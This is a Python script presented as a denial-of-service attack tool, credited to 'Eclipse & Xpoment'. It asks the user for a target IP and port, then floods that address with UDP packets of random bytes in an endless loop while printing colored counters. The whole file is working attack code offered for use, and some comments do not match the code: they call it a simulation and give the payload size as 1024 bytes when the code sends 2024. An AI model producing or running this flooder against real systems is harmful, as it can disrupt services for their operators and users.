import socket
import random
import time
from datetime import datetime

# Banner display function
def display_banner():
    banner = """
\033[1;31m
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
M       YMM M       YMM MMP     YMM MP       MM
M  mmmm   M M  mmmm   M M   mmm   M M  mmmmm  M
M  MMMMM  M M  MMMMM  M M  MMMMM  M M        YM
M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M
M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M
M        MM M        MM MMb     dMM Mb       dM
MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM v2.4.2
\033[41m\033[1;37m  Distributed Denial of Service - Attack  \033[0m
"""
    print(banner)

# Function to simulate sending packets (DDoS-like logic)
def send_ddos_packets(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create UDP socket
    bytes_to_send = random._urandom(2024)  # Generate a payload of 1024 random bytes
    sent_packets = 0  # Counter for sent packets

    # Define a list of ANSI escape color codes for rainbow effect
    rainbow_colors = [
        '\033[91m',  # Red
        '\033[93m',  # Yellow
        '\033[92m',  # Green
        '\033[96m',  # Cyan
        '\033[94m',  # Blue
        '\033[95m',  # Magenta
        '\033[90m',  # Light Gray
    ]

    try:
        while True:
            sock.sendto(bytes_to_send, (ip, port))  # Send packets to target
            sent_packets += 1

            # Cycle through the colors in the rainbow_colors list
            color = rainbow_colors[sent_packets % len(rainbow_colors)]
            print(f"{color}Sent {sent_packets} packet to {ip} through port {port}\033[0m")

            time.sleep(0.1)  # Sleep to avoid overwhelming the system too fast

    except KeyboardInterrupt:
        print("\n\033[91mAttack stopped.\033[0m")
    finally:
        sock.close()

# Main part of the script: Gathering user input and invoking the function
if __name__ == "__main__":
    display_banner()  # Show the banner at the start

    print("Coded By Eclipse & Xpoment")
    print("")

    # User input for target IP/hostname and port
    ip = input("Enter target IP: ")
    port = int(input("Enter target port: "))

    # Optional logging of current time for packet sending logs
    now = datetime.now()
    current_time = now.strftime("%Y-%m-%d %H:%M:%S")
    print(f"Starting packet sending at {current_time}")

    # Call the function to start sending packets
    send_ddos_packets(ip, port)
